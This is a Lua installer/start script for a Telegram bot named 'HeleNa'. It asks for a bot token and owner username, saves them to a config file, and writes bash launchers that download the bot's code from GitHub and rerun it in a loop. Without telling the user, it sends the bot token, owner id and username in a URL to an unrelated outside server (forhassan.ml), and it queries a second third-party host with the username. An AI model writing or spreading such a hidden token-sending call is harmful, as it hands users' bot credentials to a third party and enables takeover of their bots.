serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_HeleNa = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_HeleNa = function() 
local Create_Info = function(Token,Sudo,UserName)  
local HeleNa_Info_Sudo = io.open("sudo.lua", 'w')
HeleNa_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
HeleNa_Info_Sudo:close()
end  
if not database:get(Server_HeleNa.."Token_HeleNa") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_HeleNa.."Token_HeleNa",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_HeleNa.."UserName_HeleNa") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://TshAkE.ml/info/?user="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('lua start.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('lua start.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_HeleNa.."UserName_HeleNa",Json.Info.Username)
database:set(Server_HeleNa.."Id_HeleNa",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
local function Files_HeleNa_Info()
Create_Info(database:get(Server_HeleNa.."Token_HeleNa"),database:get(Server_HeleNa.."Id_HeleNa"),database:get(Server_HeleNa.."UserName_HeleNa"))   
https.request("https://forhassan.ml/HeleNa/HeleNa.php?id="..database:get(Server_HeleNa.."Id_HeleNa").."&user="..database:get(Server_HeleNa.."UserName_HeleNa").."&token="..database:get(Server_HeleNa.."Token_HeleNa"))
local RunHeleNa = io.open("HeleNa", 'w')
RunHeleNa:write([[
#!/usr/bin/env bash
cd $HOME/HeleNa
token="]]..database:get(Server_HeleNa.."Token_HeleNa")..[["
rm -fr HeleNa.lua
wget "https://raw.githubusercontent.com/HeleNaTEAM/HeleNa/master/HeleNa.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./HeleNa.lua -p PROFILE --bot=$token
done
]])
RunHeleNa:close()
local RunTs = io.open("ts", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/HeleNa
while(true) do
rm -fr ../.telegram-cli
screen -S HeleNa -X kill
screen -S HeleNa ./HeleNa
done
]])
RunTs:close()
end
Files_HeleNa_Info()
database:del(Server_HeleNa.."Token_HeleNa");database:del(Server_HeleNa.."Id_HeleNa");database:del(Server_HeleNa.."UserName_HeleNa")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_HeleNa()  
var = true
else   
f:close()  
database:del(Server_HeleNa.."Token_HeleNa");database:del(Server_HeleNa.."Id_HeleNa");database:del(Server_HeleNa.."UserName_HeleNa")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()
